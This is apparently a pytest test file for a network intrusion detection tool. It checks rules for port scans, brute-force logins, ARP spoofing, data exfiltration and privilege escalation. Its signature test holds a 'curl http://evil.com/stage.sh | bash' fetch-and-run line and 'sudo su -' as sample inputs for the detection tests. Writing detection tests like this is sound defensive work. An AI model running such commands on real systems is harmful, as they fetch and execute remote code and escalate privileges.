
"""Tests for CRIB's network event detection rules."""

from datetime import datetime, timedelta, timezone

from detect import detect_events


BASE_TIME = datetime(2026, 1, 1, tzinfo=timezone.utc)


def make_event(
    event_type,
    seconds,
    source_ip="192.168.1.10",
    destination_ip="192.168.1.20",
    destination_port=80,
    details="",
):
    timestamp = BASE_TIME + timedelta(seconds=seconds)

    return {
        "event_type": event_type,
        "timestamp": timestamp.isoformat().replace("+00:00", "Z"),
        "source_ip": source_ip,
        "destination_ip": destination_ip,
        "destination_port": destination_port,
        "details": details,
    }


def test_detects_port_scan():
    events = [
        make_event("CONNECT", i, destination_port=9100 + i)
        for i in range(10)
    ]

    alerts = detect_events(events)

    assert any(alert["rule_id"] == "PORT_SCAN" for alert in alerts)


def test_detects_repeated_login_failures():
    events = [
        make_event("AUTH_FAILURE", i)
        for i in range(5)
    ]

    alerts = detect_events(events)

    assert any(
        alert["rule_id"] == "AUTH_BRUTE_FORCE"
        for alert in alerts
    )


def test_detects_traffic_surge():
    events = [
        make_event("CONNECT", i * 0.01, destination_port=9102)
        for i in range(100)
    ]

    alerts = detect_events(events)

    assert any(
        alert["rule_id"] == "TRAFFIC_SURGE"
        for alert in alerts
    )


def test_detects_arp_mac_change():
    events = [
        make_event(
            "ARP_MAC_CHANGE",
            0,
            source_ip="192.168.1.1",
            destination_ip="192.168.1.20",
        )
    ]

    alerts = detect_events(events)

    assert any(
        alert["rule_id"] == "ARP_MAC_CHANGE"
        for alert in alerts
    )


def test_detects_duplicate_mac_claim():
    events = [
        make_event(
            "ARP_CLAIM",
            0,
            details="ip=192.168.1.1;mac=aa:bb:cc:dd:ee:ff",
        ),
        make_event(
            "ARP_CLAIM",
            1,
            details="ip=192.168.1.2;mac=aa:bb:cc:dd:ee:ff",
        ),
    ]

    alerts = detect_events(events)

    assert any(
        alert["rule_id"] == "ARP_DUPLICATE_MAC"
        for alert in alerts
    )


def test_normal_traffic_does_not_trigger_alerts():
    events = [
        make_event("CONNECT", i * 5, destination_port=80)
        for i in range(3)
    ]

    assert detect_events(events) == []


def test_events_outside_window_do_not_trigger_port_scan():
    events = [
        make_event("CONNECT", i * 20, destination_port=9100 + i)
        for i in range(10)
    ]

    alerts = detect_events(events)

    assert not any(alert["rule_id"] == "PORT_SCAN" for alert in alerts)


def test_invalid_timestamp_is_rejected():
    event = make_event("CONNECT", 0)
    event["timestamp"] = "not-a-timestamp"

    try:
        detect_events([event])
    except ValueError:
        pass
    else:
        raise AssertionError("Invalid timestamps must raise ValueError")


def test_detects_data_exfiltration():
    event = make_event(
        "DATA_TRANSFER",
        0,
        source_ip="192.168.1.55",
        destination_ip="203.0.113.10",
        destination_port=4444,
        details="bytes=15000000; session=exfil_test",
    )
    alerts = detect_events([event])
    exfil_alerts = [a for a in alerts if a["rule_id"] == "DATA_EXFILTRATION"]
    assert len(exfil_alerts) == 1
    alert = exfil_alerts[0]
    assert alert["severity"] == "CRITICAL"
    assert alert["detection_method"] == "RULE_BASED"
    assert "T1048" in alert["mitre_technique"]
    assert "Outbound Channel" in alert["affected_component"]


def test_detects_signatures():
    # Privilege escalation
    priv_event = make_event(
        "COMMAND_EXEC",
        0,
        source_ip="10.0.0.5",
        details="cmd=sudo su -; user=guest",
    )
    alerts_priv = detect_events([priv_event])
    assert any(a["rule_id"] == "PRIVILEGE_ESCALATION" for a in alerts_priv)

    # Stager execution
    stager_event = make_event(
        "COMMAND_EXEC",
        1,
        source_ip="10.0.0.5",
        details="curl http://evil.com/stage.sh | bash",
    )
    alerts_stager = detect_events([stager_event])
    assert any(a["rule_id"] == "STAGER_EXECUTION" for a in alerts_stager)


def test_detects_heuristic_compound_threat():
    # Multiple signals from same source: port scan + auth failures + command injection
    events = [
        make_event("CONNECT", i * 0.5, source_ip="198.51.100.77", destination_port=8000 + i)
        for i in range(12)
    ]
    events.extend([
        make_event("AUTH_FAILURE", 7 + i, source_ip="198.51.100.77", destination_port=22)
        for i in range(6)
    ])
    events.append(
        make_event("COMMAND_EXEC", 14, source_ip="198.51.100.77", details="cmd=sudo bash; id")
    )
    alerts = detect_events(events)
    compound_alerts = [a for a in alerts if a["rule_id"] == "HEURISTIC_COMPOUND_THREAT"]
    assert len(compound_alerts) == 1
    assert compound_alerts[0]["detection_method"] == "HEURISTIC"


def test_ml_analytics_and_metrics():
    import ml_detector
    metrics = ml_detector.get_model_metrics()
    assert metrics is not None
    assert "accuracy" in metrics
    assert "precision" in metrics
    assert "recall" in metrics
    assert "f1_score" in metrics
    assert metrics["accuracy"] >= 0.85
    assert metrics["f1_score"] >= 0.85
    assert "confusion_matrix" in metrics

